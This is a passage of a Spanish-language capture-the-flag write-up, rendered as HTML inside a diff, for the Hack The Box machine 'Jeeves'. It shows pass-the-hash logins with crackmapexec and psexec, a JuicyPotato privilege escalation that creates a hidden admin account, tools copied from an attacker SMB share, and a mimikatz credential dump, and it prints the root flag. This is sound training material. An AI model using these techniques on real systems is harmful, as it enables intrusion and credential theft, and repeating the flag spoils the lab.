+Cost 2 <span class="o">(</span>version<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
+Cost 3 <span class="o">(</span>algorithm <span class="o">[</span><span class="nv">0</span><span class="o">=</span>AES, <span class="nv">1</span><span class="o">=</span>TwoFish, <span class="nv">2</span><span class="o">=</span>ChaCha]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+moonshine1       <span class="o">(</span>CEH<span class="o">)</span>
+1g 0:00:01:27 DONE <span class="o">(</span>2023-07-02 19:14<span class="o">)</span> 0.01142g/s 628.1p/s 628.1c/s 628.1C/s mwuah..moonshine1
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos usar el <code class="language-plaintext highlighter-rouge">keepassxc</code> para poder abrir el archivo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web17.png" />
+</p>
+
+<ul>
+  <li>Y bueno vemos varias cosas.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web18.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Si hacemos un <code class="language-plaintext highlighter-rouge">ctrl+c</code> vemos que nos copea esto <code class="language-plaintext highlighter-rouge">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>.</p>
+  </li>
+  <li>
+    <p>Y bueno eso es un <code class="language-plaintext highlighter-rouge">hash</code> que podemos usar para aplicar <code class="language-plaintext highlighter-rouge">passthehash</code>.</p>
+  </li>
+  <li>
+    <p>Vamos a validarlo con <code class="language-plaintext highlighter-rouge">crackmapexec</code> si es el del usuario <strong>Administrator</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">':e0fb1fb85756c24235ff238cbe81fe00'</span>
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\A</span>dministrator::e0fb1fb85756c24235ff238cbe81fe00 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+
+<ul>
+  <li>Pues bueno podemos conectarnos con el <code class="language-plaintext highlighter-rouge">hash nt</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py WORKGROUP/Administrator@10.10.10.63 <span class="nt">-hashes</span> :e0fb1fb85756c24235ff238cbe81fe00
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file LBvnmiYK.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service QTka on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service QTka.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.10586]
+<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="roottxt">Root.txt</h2>
+
+<ul>
+  <li>Nos dicen que la flag está en otro lado.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+11/08/2017  10:05 AM    &lt;DIR&gt;          <span class="nb">.</span>
+11/08/2017  10:05 AM    &lt;DIR&gt;          ..
+12/24/2017  03:51 AM                36 hm.txt
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,817,216 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>hm.txt
+The flag is elsewhere.  Look deeper.
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno vamos a hacer un <code class="language-plaintext highlighter-rouge">dir /r /s</code> que corresponden a <code class="language-plaintext highlighter-rouge">data streams</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web19.png" />
+</p>
+
+<ul>
+  <li>Y allí vemos la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir</span> /r /s
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+11/08/2017  10:05 AM    &lt;DIR&gt;          <span class="nb">.</span>
+11/08/2017  10:05 AM    &lt;DIR&gt;          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:<span class="nv">$DATA</span>
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
+
+     Total Files Listed:
+               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,755,776 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; more &lt; hm.txt:root.txt
+afbc5bd4b615a60648cec41c6ac92530
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-root-second-way">Shell as root second way</h2>
+
+<ul>
+  <li>Si vemos los privilegios del usuario vemos que forma parte del grupo <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> podemos usar el <strong>JuicyPotato</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
+SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                      Disabled
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/img.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Aquí puedes encontrarlo <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a>.</p>
+  </li>
+  <li>
+    <p>Vamos a pasarlo ala maquina victima pero en la ruta <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> y nos vamos a crear una carpeta para almacenarlo hay.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>Prives
+
+<span class="nb">cd </span>Prives
+<span class="nb">cd </span>Prives
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\J</span>uicyPotato.exe JuicyPotato.exe
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives
+
+07/03/2023  02:59 AM    &lt;DIR&gt;          <span class="nb">.</span>
+07/03/2023  02:59 AM    &lt;DIR&gt;          ..
+07/02/2023  09:50 PM           347,648 JuicyPotato.exe
+               1 File<span class="o">(</span>s<span class="o">)</span>        347,648 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,407,399,424 bytes free
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a agregar un nuevo usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net user miguel miguel123</span><span class="nv">$!</span><span class="s2"> /add"</span> <span class="nt">-l</span> 1337
+JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net user miguel miguel123</span><span class="nv">$!</span><span class="s2"> /add"</span> <span class="nt">-l</span> 1337
+Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
+......
+<span class="o">[</span>+] authresult 0
+<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
+
+<span class="o">[</span>+] CreateProcessWithTokenW OK
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user
+net user
+
+User accounts <span class="k">for</span> <span class="se">\\</span>JEEVES
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+Administrator            DefaultAccount           Guest
+kohsuke                  miguel
+The <span class="nb">command </span>completed successfully.
+
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Si validamos vemos que es válido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!'</span>
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\m</span>iguel:miguel123<span class="nv">$!</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora tenemos que hacer que forme del grupo <strong>Administrators</strong> podemos hacerlo con <strong>JuicyPotato.exe</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c net localgroup Administrators miguel /add"</span> <span class="nt">-l</span> 1337
+Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
+......
+<span class="o">[</span>+] authresult 0
+<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
+
+<span class="o">[</span>+] CreateProcessWithTokenW OK
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno ahora formamos parte del grupo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user miguel
+net user miguel
+User name                    miguel
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            7/3/2023 3:03:27 AM
+Password expires             Never
+Password changeable          7/3/2023 3:03:27 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+The command completed successfully.
+
+
+C:\Windows\Temp\Prives&gt;
+</span></code></pre></div></div>
+
+<ul>
+  <li>Antes de validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> debemos hacer lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c reg add HKLM</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\P</span><span class="s2">olicies</span><span class="se">\S</span><span class="s2">ystem /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</span> <span class="nt">-l</span> 1337
+Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 1337
+......
+<span class="o">[</span>+] authresult 0
+<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
+
+<span class="o">[</span>+] CreateProcessWithTokenW OK
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rives&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora validamos con <strong>crackmapexec</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">'miguel123$!'</span>
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\m</span>iguel:miguel123<span class="nv">$!</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos podemos conectar con la contraseña que proporcionamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py WORKGROUP/miguel@10.10.10.63 cmd.exe
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file TjCVyPZu.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service ntnX on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service ntnX.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.10586]
+<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="extra">Extra</h2>
+
+<ul>
+  <li>Algo que podemos hacer es subir el <code class="language-plaintext highlighter-rouge">mimikatz.exe</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/ok.png" />
+</p>
+
+<ul>
+  <li><a href="https://github.com/gentilkiwi/mimikatz/releases/">https://github.com/gentilkiwi/mimikatz/releases/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip mimikatz_trunk.zip
+Archive:  mimikatz_trunk.zip
+  inflating: kiwi_passwords.yar
+  inflating: mimicom.idl
+  inflating: README.md
+   creating: Win32/
+  inflating: Win32/mimidrv.sys
+  inflating: Win32/mimikatz.exe
+  inflating: Win32/mimilib.dll
+  inflating: Win32/mimilove.exe
+  inflating: Win32/mimispool.dll
+   creating: x64/
+  inflating: x64/mimidrv.sys
+  inflating: x64/mimikatz.exe
+  inflating: x64/mimilib.dll
+  inflating: x64/mimispool.dll
+❯ <span class="nb">ls</span>
+ Win32   CEH.kdbx   JuicyPotato.exe      mimicom.idl          nc.exe
+ x64     <span class="nb">hash</span>       kiwi_passwords.yar   mimikatz_trunk.zip   README.md
+❯ <span class="nb">cd </span>x64
+❯ <span class="nb">ls</span>
+ mimidrv.sys   mimikatz.exe   mimilib.dll   mimispool.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora aprovechándonos de nuestro recurso compartido que tenemos con <code class="language-plaintext highlighter-rouge">smbserver.py</code> vamos a subirlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.63,49676<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:parrotsec<span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ psexec.py WORKGROUP/Administrator@10.10.10.63 <span class="nt">-hashes</span> :e0fb1fb85756c24235ff238cbe81fe00
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file whUEDSYi.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service MlrO on 10.10.10.63.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service MlrO.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.10586]
+<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">mkdir </span>prives
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; <span class="nb">cd </span>prives
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; copy <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\m</span>imikatz.exe mimikatz.exe
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; <span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives
+
+07/04/2023  12:54 AM    &lt;DIR&gt;          <span class="nb">.</span>
+07/04/2023  12:54 AM    &lt;DIR&gt;          ..
+09/19/2022  05:44 PM         1,355,264 mimikatz.exe
+               1 File<span class="o">(</span>s<span class="o">)</span>      1,355,264 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,427,297,792 bytes free
+
+C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo ejecutamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rives&gt; .<span class="se">\m</span>imikatz.exe <span class="s2">"sekurlsa::logonPasswords"</span> <span class="nb">exit</span>
+
+  .#####.   mimikatz 2.2.0 <span class="o">(</span>x64<span class="o">)</span> <span class="c">#19041 Sep 19 2022 17:44:08</span>
+ .## ^ <span class="c">##.  "A La Vie, A L'Amour" - (oe.eo)</span>
+ <span class="c">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
+ <span class="c">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
+ <span class="s1">'## v ##'</span>       Vincent LE TOUX             <span class="o">(</span> vincent.letoux@gmail.com <span class="o">)</span>
+  <span class="s1">'#####'</span>        <span class="o">&gt;</span> https://pingcastle.com / https://mysmartlogon.com <span class="k">***</span>/
+
+mimikatz<span class="o">(</span>commandline<span class="o">)</span> <span class="c"># sekurlsa::logonPasswords</span>
+
+Authentication Id : 0 <span class="p">;</span> 995 <span class="o">(</span>00000000:000003e3<span class="o">)</span>
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+Logon Time        : 7/4/2023 12:09:01 AM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
+	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 <span class="p">;</span> 118956 <span class="o">(</span>00000000:0001d0ac<span class="o">)</span>
+Session           : Service from 0
+User Name         : kohsuke
+Domain            : JEEVES
+Logon Server      : JEEVES
+Logon Time        : 7/4/2023 12:09:00 AM
+SID               : S-1-5-21-2851396806-8246019-2289784878-1001
+	msv :	
+	<span class="o">[</span>00010000] CredentialKeys
+	<span class="k">*</span> NTLM     : ab4043bce374136df6e09734d4577738
+	<span class="k">*</span> SHA1     : 6f0672881aa8f2e79d9097b8dba62bdcbddde585
+	<span class="o">[</span>00000003] Primary
+	<span class="k">*</span> Username : kohsuke
+	<span class="k">*</span> Domain   : JEEVES
+	<span class="k">*</span> NTLM     : ab4043bce374136df6e09734d4577738
+	<span class="k">*</span> SHA1     : 6f0672881aa8f2e79d9097b8dba62bdcbddde585
+	tspkg :	
+	wdigest :	
+	<span class="k">*</span> Username : kohsuke
+	<span class="k">*</span> Domain   : JEEVES
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	kerberos :	
+	<span class="k">*</span> Username : kohsuke
+	<span class="k">*</span> Domain   : JEEVES
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	ssp :	
+	credman :	
+
+Authentication Id : 0 <span class="p">;</span> 997 <span class="o">(</span>00000000:000003e5<span class="o">)</span>
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+Logon Time        : 7/4/2023 12:08:58 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
+	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	kerberos :	
+	<span class="k">*</span> Username : <span class="o">(</span>null<span class="o">)</span>
+	<span class="k">*</span> Domain   : <span class="o">(</span>null<span class="o">)</span>
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	ssp :	
+	credman :	
+
+Authentication Id : 0 <span class="p">;</span> 73605 <span class="o">(</span>00000000:00011f85<span class="o">)</span>
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+Logon Time        : 7/4/2023 12:08:58 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
+	<span class="k">*</span> Domain   : WORKGROUP
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 <span class="p">;</span> 73510 <span class="o">(</span>00000000:00011f26<span class="o">)</span>
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+Logon Time        : 7/4/2023 12:08:58 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
+	<span class="k">*</span> Domain   : WORKGROUP
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 <span class="p">;</span> 996 <span class="o">(</span>00000000:000003e4<span class="o">)</span>
+Session           : Service from 0
+User Name         : JEEVES<span class="err">$</span>
+Domain            : WORKGROUP
+Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+Logon Time        : 7/4/2023 12:08:58 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	<span class="k">*</span> Username : JEEVES<span class="err">$</span>
+	<span class="k">*</span> Domain   : WORKGROUP
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	kerberos :	
+	<span class="k">*</span> Username : jeeves<span class="err">$</span>
+	<span class="k">*</span> Domain   : WORKGROUP
+	<span class="k">*</span> Password : <span class="o">(</span>null<span class="o">)</span>
+	ssp :	
+	credman :	
+
+Authentication Id : 0 <span class="p">;</span> 45075 <span class="o">(</span>00000000:0000b013<span class="o">)</span>
+Session           : UndefinedLogonType from 0
